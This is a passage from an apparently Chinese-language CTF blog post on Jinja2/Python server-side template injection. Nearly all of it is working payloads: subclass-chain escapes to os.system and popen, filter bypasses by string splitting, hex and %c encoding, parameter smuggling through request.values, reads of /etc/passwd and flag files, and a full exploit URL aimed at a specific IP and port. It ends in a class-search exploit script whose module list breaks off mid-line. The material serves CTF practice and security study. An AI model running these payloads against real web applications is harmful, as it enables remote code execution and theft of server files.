<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

().__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>









<h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。</p>
<p>如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;__bu&#x27;</span>+<span class="hljs-string">&#x27;iltins__&#x27;</span>][<span class="hljs-string">&#x27;__impor&#x27;</span>+<span class="hljs-string">&#x27;t__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).system(<span class="hljs-string">&#x27;ca&#x27;</span>+<span class="hljs-string">&#x27;lc&#x27;</span>)</code></pre></div>









<h2 id="hex编码（重要）"><a href="#hex编码（重要）" class="headerlink" title="hex编码（重要）"></a><strong>hex编码（重要）</strong></h2><p>hex编码可以绕过大部分过滤</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;</code></pre></div>



<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5f&#39;][&#39;\x5f\x5fbuiltins\x5f\x5f&#39;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div>



<p>例如：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</code></pre></div>

<p>Into:</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64&#x27;</span>).read()&#125;&#125;</code></pre></div>



<p><strong>另一个更加高级的例子</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;
    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> <span class="hljs-keyword">in</span> x.__name__ %&#125;
        &#123;&#123;x()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;
    &#123;%endif%&#125;
&#123;%endfor%&#125;</code></pre></div>

<p>Can be converted to:</p>
<p><strong>注：</strong>将<code>.__class__</code>用<code>[&#39;__class__&#39;]</code>的方式是jinja2中支持的语法，在python 命令行中无法这样使用。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> [][<span class="hljs-string">&quot;__class__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)][<span class="hljs-string">&quot;__base__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)][<span class="hljs-string">&quot;__subclasses__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)]() %&#125;
    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>) <span class="hljs-keyword">in</span> a[<span class="hljs-string">&quot;__name__&quot;</span>[<span class="hljs-string">&quot;decode&quot;</span>](<span class="hljs-string">&quot;hex&quot;</span>)] %&#125;
        &#123;&#123;a()[<span class="hljs-string">&quot;5F6D6F64756C65&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F6275696C74696E735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F696D706F72745F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6F73&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;706F70656E&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6563686F2024666C6167&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;72656164&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)]()&#125;&#125;
    &#123;%endif%&#125;
&#123;%endfor%&#125;</code></pre></div>



<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> [][<span class="hljs-string">&quot;5F5F636C6173735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F626173655F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F737562636C61737365735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)]() %&#125;
    &#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;7761726E696E67&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>) <span class="hljs-keyword">in</span> a[<span class="hljs-string">&quot;5F5F6E616D655F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)] %&#125;
        &#123;&#123;a()[<span class="hljs-string">&quot;5F6D6F64756C65&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F6275696C74696E735F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)][<span class="hljs-string">&quot;5F5F696D706F72745F5F&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6F73&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;706F70656E&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)](<span class="hljs-string">&quot;6c73&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>))[<span class="hljs-string">&quot;72656164&quot;</span>[<span class="hljs-string">&quot;\x64\x65\x63\x6F\x64\x65&quot;</span>](<span class="hljs-string">&quot;\x68\x65\x78&quot;</span>)]()&#125;&#125;
    &#123;%endif%&#125;
&#123;%endfor%&#125;</code></pre></div>



<h2 id="Unicode-类似hex"><a href="#Unicode-类似hex" class="headerlink" title="Unicode 类似hex"></a>Unicode 类似hex</h2><h2 id="格式化字符串方法"><a href="#格式化字符串方法" class="headerlink" title="格式化字符串方法"></a>格式化字符串方法</h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">?&#123;% print(session|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;open(\&quot;&#x2F;flag.txt\&quot;).read()&quot;)%&#125;
​
# 将&quot;&quot;内的字符串换成格式化字符串的形式
​
http:&#x2F;&#x2F;124.70.199.12:30195&#x2F;success?msg&#x3D;&#123;%print(session|attr(&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(110)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95))|attr(&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(103)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(111)%2b&quot;%c&quot;%(98)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(115)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95))|attr(&quot;%c&quot;%(103)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(116))(&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(98)%2b&quot;%c&quot;%(117)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(105)%2b&quot;%c&quot;%(110)%2b&quot;%c&quot;%(115)%2b&quot;%c&quot;%(95)%2b&quot;%c&quot;%(95))|attr(&quot;%c&quot;%(103)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(116))(&quot;%c&quot;%(101)%2b&quot;%c&quot;%(118)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(108))(&quot;%c&quot;%(111)%2b&quot;%c&quot;%(112)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(110)%2b&quot;%c&quot;%(40)%2b&quot;%c&quot;%(39)%2b&quot;%c&quot;%(102)%2b&quot;%c&quot;%(108)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(103)%2b&quot;%c&quot;%(46)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(120)%2b&quot;%c&quot;%(116)%2b&quot;%c&quot;%(39)%2b&quot;%c&quot;%(41)%2b&quot;%c&quot;%(46)%2b&quot;%c&quot;%(114)%2b&quot;%c&quot;%(101)%2b&quot;%c&quot;%(97)%2b&quot;%c&quot;%(100)%2b&quot;%c&quot;%(40)%2b&quot;%c&quot;%(41)))%&#125;</code></pre></div>







<h2 id="过滤-‘-“-args"><a href="#过滤-‘-“-args" class="headerlink" title="过滤 ‘    “    _    .    [    ]    args"></a>过滤 ‘    “    _    .    [    ]    args</h2><p>过滤了”,所以hex编码不能用了</p>
<p>过滤了args，所以request.args不能用了，可以用request.values绕过，POST和GET两种方法传递的数据它都可以接收。</p>
<p>示例payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(77)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;cat flag.txt&#39;).read()</code></pre></div>



<p>在大多数示例中，我们用来<code>request.args</code>访问GET参数，但是可以使用自定义值填充其他字典：</p>
<ul>
<li>GET： <code>request.args</code></li>
<li>Cookie： <code>request.cookies</code></li>
<li>headers： <code>request.headers</code></li>
<li>environ： <code>request.environ</code></li>
<li>POST： <code>request.values</code></li>
</ul>
<h2 id="过滤了-‘-123-request-args-values-g"><a href="#过滤了-‘-123-request-args-values-g" class="headerlink" title="过滤了 ‘    _    .    [    {&#123;    request    args    values    g"></a>过滤了 ‘    _    .    [    {&#123;    request    args    values    g</h2><ul>
<li>没有过滤”，可以进行hex编码</li>
<li>过滤了request，我们可以使用 <code>（）</code>配合attr</li>
<li>过滤了{&#123; &#125;}，使用<code>&#123;%%&#125;`代替





示例payload：

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;%print(()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)())%&#125;

&#123;%print(()|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;)()|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(258)|attr(&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;)|attr(&quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat\x20\x66\x6c\x61\x67\x2e\x74\x78\x74&quot;)|attr(&quot;read&quot;)())%&#125;</code></pre></div>

# **利用脚本**

## 0x01 搜索可用类

找到不含wrapper的类然后列举出其中含有`os或者sys或者__builtins__`的全局变量

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> chain <span class="hljs-keyword">import</span> search_for_os_sys_builins,print_result

unbound_class = []
os_list = []
sys_list = []
builtins_list = []


results = search_for_os_sys_builins()
<span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:
    <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;flag&#x27;</span>]:
        <span class="hljs-comment"># print(&#x27;[+]&#x27; + result)</span>
        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>]:
            <span class="hljs-keyword">if</span> results[result][<span class="hljs-string">&#x27;result&#x27;</span>][r] == <span class="hljs-string">&#x27;yes&#x27;</span> :
                <span class="hljs-keyword">if</span> r == <span class="hljs-string">&#x27;os&#x27;</span>:
                    os_list.append(result)
                <span class="hljs-keyword">if</span> r == <span class="hljs-string">&#x27;sys&#x27;</span>:
                    sys_list.append(result)
                <span class="hljs-keyword">if</span> r == <span class="hljs-string">&#x27;__builtins__&#x27;</span>:
                    builtins_list.append(result)
print(os_list)
print(sys_list)
print(builtins_list)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()):

    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(i[<span class="hljs-number">1</span>].__init__):
        unbound_class.append(i[<span class="hljs-number">1</span>].__init__)
        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> os_list:
            <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> i[<span class="hljs-number">1</span>].__init__.__globals__.keys():
                <span class="hljs-comment"># print(i)</span>
                print(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>].__init__,x)

        <span class="hljs-comment"># for x in sys_list:</span>
        <span class="hljs-comment">#     if x in i[1].__init__.__globals__.keys():</span>
        <span class="hljs-comment">#         # print(i)</span>
        <span class="hljs-comment">#         print(i[0], i[1].__init__)</span>
        <span class="hljs-comment">#</span>
        <span class="hljs-comment"># print(&quot;[+] __builtins__:&quot;)</span>
        <span class="hljs-comment"># for x in os_list:</span>
        <span class="hljs-comment">#     if x in i[1].__init__.__globals__.keys():</span>
        <span class="hljs-comment">#         # print(i)</span>
        <span class="hljs-comment">#         print(i[0], i[1].__init__)</span></code></pre></div>



chain.py

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf8 -*-</span>
<span class="hljs-comment"># By Macr0phag3</span>
<span class="hljs-comment"># in 2019-05-07 19:46:12</span>
<span class="hljs-comment"># ------------------------------------</span>

<span class="hljs-comment"># this, antigravity 库删掉</span>
all_modules_2 = [
    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multifile&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;mutex&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;compiler&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;talloc&#x27;</span>, <span class="hljs-string">&#x27;_abcoll&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;cookielib&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_bsddb&#x27;</span>, <span class="hljs-string">&#x27;copy_reg&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;thread&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;dbhash&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;os2emxpath&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;tkColorChooser&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;tkCommonDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;tkFileDialog&#x27;</span>, <span 